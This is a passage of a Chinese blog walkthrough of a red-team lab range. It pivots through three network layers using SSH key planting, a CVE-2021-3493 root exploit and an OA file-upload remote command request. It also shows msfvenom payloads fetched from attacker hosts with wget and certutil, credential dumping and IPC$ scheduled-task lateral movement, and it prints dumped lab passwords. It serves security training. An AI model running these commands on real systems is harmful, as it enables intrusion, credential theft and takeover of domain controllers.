+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp -avx &#x2F;cyshack&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;cyshack&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys </span><br><span class="line">&#x2F;&#x2F; -avx 将权限也一起复制</span><br><span class="line"></span><br><span class="line">echo &gt; authorized_keys  &#x2F;&#x2F;将内容清空</span><br><span class="line"></span><br><span class="line">echo &#39;生成的.pub内容&#39; &gt; authorized_keys  &#x2F;&#x2F;将ssh秘钥写入</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//4d416464c2b043a89fe10e1bdd984af4.png"><br>用web1尝试ssh连接 web2：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -i cyshack ubuntu@192.168.52.20</span><br></pre></td></tr></table></figure>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//644d08c2a340453cafe922512d54a65d.png"><br>获取到了web2的ubuntu用户的shell</p>
+<p>又发现一个93网段</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d8f86df95c2348abb10233890c29522a.png"></p>
+<h1 id="CVE-2021-3493"><a href="#CVE-2021-3493" class="headerlink" title="CVE-2021-3493"></a>CVE-2021-3493</h1><p>影响版本：</p>
+<blockquote>
+<p>Ubuntu 20.10<br>Ubuntu 20.04 LTS<br>Ubuntu 18.04 LTS<br>Ubuntu 16.04 LTS<br>Ubuntu 14.04 ESM</p>
+</blockquote>
+<p>将web2的ubuntu进行提权</p>
+<p>exp：<a target="_blank" rel="noopener" href="https://github.com/briskets/CVE-2021-3493/blob/main/exploit.c">CVE-2021-3493/exploit.c at main · briskets</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim exploit.c #将下载的exploit.c的内容粘贴到该文件中</span><br><span class="line">gcc exploit.c -o exploit #编译</span><br><span class="line">chmod +x exploit</span><br><span class="line">.&#x2F;exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//fb61764762c64ddbab71ab0878bc7686.png"></p>
+<h1 id="上线MSF"><a href="#上线MSF" class="headerlink" title="上线MSF"></a>上线MSF</h1><p>将这两台root机器上线到msf</p>
+<p>Web1：</p>
+<p>可以msfvenom生成，web1再执行wget并运行，来反弹shell</p>
+<p>这里直接运用 <code>web_delivery</code> 进行上线，记得切换<code>payload</code> 和 <code>target</code></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//82bc99be64074c389d8ad89c5840e9b8.png"><br><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//1d07be6335f848b7a948bc183d4f3c1b.png"><br>下一步就是添加路由上线web2，msf更新后，添加路由更方便了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;multi&#x2F;manage&#x2F;autoroute</span><br></pre></td></tr></table></figure>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//7ae47f7ea9494f50858d4053fe86705d.png"></p>
+<p>生成木马，这里运用 <code>bind_tcp</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;8003 -f elf &gt;shell2.elf</span><br></pre></td></tr></table></figure>
+<p>这里怎么让这个木马传到web2呢？因为它不出网，所以web1利用 <code>python起一个httpserver</code> 然后web2利用wget这个木马</p>
+<p>上传木马到web1</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">upload .&#x2F;shell.elf &#x2F;tmp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//3d6bc3360d674df88aacb8a792b7210d.png"></p>
+<p>web1起一个服务：注意路径，要起到木马的目录下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//60a72cecad1a4d649c5b31d2f67d27c8.png"><br>web2进行下载：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.52.10:8000&#x2F;shell.elf</span><br><span class="line">chmod +x shell.elf</span><br><span class="line">.&#x2F;shell.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//1b49ba7a8e9740b8971cb0ad4d4f3f71.png"><br>运行上线</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//7e836052337d412a859e3863fca8a3cf.png"><br>至此有两个机器的shell</p>
+<h1 id="二层网络渗透"><a href="#二层网络渗透" class="headerlink" title="二层网络渗透"></a>二层网络渗透</h1><p>添加路由，添加代理(socks_proxy模块记得开启)</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>内网扫描，先扫52网段，有个问题是，pc1开启防火墙，msf 和 nmap都试了几个都没能扫出来，怎么破？</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//239ff8697d3f41ac9bc5e6fc4e61d045.png"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d56f010a795d4a8683c7696002dafd2b.png"><br>最后 <code>netbios</code> 破了，但是只扫出来一次，os为windows</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d176266efa75473a966f4826fbea7a08.png"><br>Nmap扫一下pc1，没扫出来，哎，先手动关了防火墙，进行下面的</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT -sV -F  192.168.52.30</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//cf98e4a1835f41a0ab3c5f2df20c7386.png"><br>发现8080有一个 http 服务</p>
+<p>再扫一下版本信息，win7 还存在域环境</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2750c4ec2f724cdeb24ec6503cdfd6bd.png"><br>既然是win7，ms17_010</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//ea822a525dc147438753a1f2653ee50b.png"><br><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//083e4e10ccde4dcb9c560f210f4dfb86.png"><br>失败了</p>
+<h2 id="添加代理-访问-http-服务"><a href="#添加代理-访问-http-服务" class="headerlink" title="添加代理 访问 http 服务"></a>添加代理 访问 http 服务</h2><p>看看http服务吧，浏览器先添加代理</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//793acbb4dd84467d98afa369909944e8.png" alt="在这里插入图片描述"><br>或者proxy代理工具，根据情况自动调整</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//328ef4bf59ac4f649004955c1fd88330.png"><br>访问：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//66c22bc9e15e411a9374d6ca00368474.png"><br>信息收集：/inc/expired.php</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//9392aab0eb624a3b823336b4ff1cbed9.png"></p>
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/334640244">通达OA前台任意文件上传漏洞+文件包含漏洞导致getshell - 知乎 (zhihu.com)</a></p>
+<p>Burpsuite设置socks代理，不知道为什么socks4不能用：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//f0d6c518255c45f5a735d7c9efcacfc2.png"></p>
+<p>上传：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//e012d20b58114b04aa3bf5366a7d38fa.png"></p>
+<p>post:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.52.30:8080&#x2F;&#x2F;ispirit&#x2F;interface&#x2F;gateway.php</span><br><span class="line"></span><br><span class="line">json&#x3D;&#123;&quot;url&quot;:&quot;&#x2F;general&#x2F;..&#x2F;..&#x2F;attach&#x2F;im&#x2F;2108&#x2F;1888762391.jpg&quot;&#125;&amp;cmd&#x3D;net user</span><br></pre></td></tr></table></figure>
+<h2 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h2><p>Msf利用web_delivery</p>
+<p>生成powershell</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//3d749b30b2b944fea074420f630ccd2f.png" alt="在这里插入图片描述"></p>
+<p>这里没有上线成功</p>
+<p>想着让win7主动下载木马</p>
+<p>这里我偷个懒直接攻击机起一个服务，在真实渗透环境中，应该上传到跳板机上</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//f482bb44341a414ea24a0e65607a40e4.png"></p>
+<p>让win7主动下载</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;192.168.42.224&#x2F;shell3.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//dd986b533f41492b95f58002ee730b8b.png"><br>开启监听：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//a192967f4cb844c38d30efdfc0ba09e0.png"><br>没反应，传一个 bind_tcp的马</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//cc8069b746e042be99dd8051c96dd146.png"><br>监听换个payload，再次执行上面</p>
+<p>上线成功：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//9dd2a2c725b944f399071251d0b1c713.png"></p>
+<h1 id="三层网络信息收集"><a href="#三层网络信息收集" class="headerlink" title="三层网络信息收集"></a>三层网络信息收集</h1><h2 id="降权"><a href="#降权" class="headerlink" title="降权"></a>降权</h2><p>先看一下权限</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//b56f595b3d0843c4bb63d76f8e8d27d4.png"><br>System权限，为了方便信息收集，将当前权限降为普通域用户，因为不是域用户没有权限执行域命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getuid &#x2F;&#x2F;查看当前token</span><br><span class="line">use incognito &#x2F;&#x2F;加载incognito</span><br><span class="line">list_tokens -u &#x2F;&#x2F;列出accesstoken</span><br><span class="line">impersonate_token &quot;DEMO\douser&quot;  &#x2F;&#x2F;模拟&quot;DEMO\douser”用户</span><br><span class="line">rev2self  &#x2F;&#x2F;返回之前的accesstoken权限</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//04f48daef0414c1ba373b9c1ac2b9286.png"><br>降权成功</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//b7fd5c8867d447baa2f26f09c1ddcef4.png"><br>进入shell失败，那么 <code>进程迁移到域用户</code>，这里迁移了好几个都是system权限，还得多学习这方面</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//026e2ebdeb0f470993bfe597570d84fc.png"></p>
+<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><p>利用域用户进行信息收集</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//5e0f994fd9334d6aa9520fef3e9deeaa.png"><br>域用户</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//cc5fb2abf6af4f00916453387f74d3bf.png"><br>域内机器</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//e77e5652e9b744f18af11ec5ea0f86e7.png"><br>域内其他主机名：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//bc3ae6daecb44b3b82f6695cb0d94be3.png"><br>域控列表</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//dc11dcb9bf074a748f8d75f5a4cb74d9.png"><br>域控ip</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//456757690554447086f35d1d68ffdccc.png"><br>域管</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//7fe47b85a98244938ffb2118a26672be.png"><br>整理：当前PC1(192.168.93.20)存在域环境，域控DC(192.168.93.30)和PC2(192.168.93.40)  域管账户为administrator</p>
+<h2 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h2><p>因为抓密码要system权限，所以我们再打一个system权限</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//6da88b4814044d39b8f8048caea0cae9.png"><br>抓取到密码：</p>
+<blockquote>
+<p>bunny:Bunny2021<br>administrator:Whoami2021</p>
+</blockquote>
+<p>开启3389</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//5fc0111ed76f4b86927207d8b9266570.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains rdesktop -g 1440x900 -r disk:LinuxxDisk&#x3D;&#x2F;root&#x2F;Downloads -u bunny -p &quot;Bunny2021&quot; 192.168.52.30</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//9d82071875e9491a891573cbdea27aae.png"><br>失败</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//0a63b81c38e94316ba87add67ad126aa.png"></p>
+<h1 id="三层网络渗透"><a href="#三层网络渗透" class="headerlink" title="三层网络渗透"></a>三层网络渗透</h1><p>接下来就是王第三层网络进行渗透</p>
+<p>添加路由</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2ada0f0b4d604f279ecacea0d1490916.png"><br>探测windows版本：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//42fc36db087548d3b2b90920cd5dbe9d.png"></p>
+<p>Ms17-010</p>
+<p>先打win7(PC2)失败</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//e9fc04d47e5b48cbab8aad3f04330061.png"></p>
+<p>我看师傅们都是利用17_010来上线的，打的时候经常断掉，因为抓取过域管密码，所以尝试 <code>ipc</code></p>
+<h2 id="IPC"><a href="#IPC" class="headerlink" title="$IPC"></a>$IPC</h2><p>建立ipc连接</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//4dfe2f47d95d4bbfa759dca4906fed1f.png"><br>生成木马：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d0710ced3002422888bef520910d9f3e.png"><br>上传到PC1    </p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//83767830d60e47a697f16aea593f6e95.png"><br>共享到PC2</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//48124d1729b54dbf966914ab0415a6a1.png"><br>计划任务开启：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\192.168.93.40 16:45 c:\houmen.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//0693a37257e64f9ea776866dd160f4c1.png"><br>开启监听，成功上线：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//77a62349712941489cec268835f475fd.png"><br>删除记录：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.93.40\ipc$ &#x2F;del</span><br></pre></td></tr></table></figure>
+
+<h2 id="psexec-域控"><a href="#psexec-域控" class="headerlink" title="psexec-域控"></a>psexec-域控</h2><p>尝试域控</p>
+<p>Psexec试一下：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//93ae7b9b9ffc4f14a69deace9a3b1637.png"><br>失败，原来是防火墙</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//738791180f0d45ea8d1b68772a3cdd3e.png"><br>再次尝试建立ipc并用sc命令关闭域控防火墙</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//66c9fec437c7444e8ab4aa882ea29d12.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\192.168.93.30 create unablefirewall binpath&#x3D; “netsh advfirewall set allprofiles state off &#x2F;&#x2F;创建服务</span><br><span class="line">sc \\192.168.93.30 start unablefirewall &#x2F;&#x2F;启动服务</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//f1de3b7d8da04b6aa1463f61ce5e4bf3.png"><br>再打一遍成功上线：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//fbba812767464392934d090eec8ae188.png"><br>这里当然也可以用ipc传马</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9574#toc-6">Vulnstack内网靶场渗透记录</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/264560.html">自主搭建的三层网络域渗透靶场打靶记录</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/12/25/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%BA%8C%EF%BC%89/" rel="prev" title="ATT&CK红队评估实战靶场（二）">
+                  <i class="fa fa-angle-left"></i> ATT&CK红队评估实战靶场（二）
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/12/25/ATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/" rel="next" title="ATT&CK红队评估实战靶场（一）">
+                  ATT&CK红队评估实战靶场（一） <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
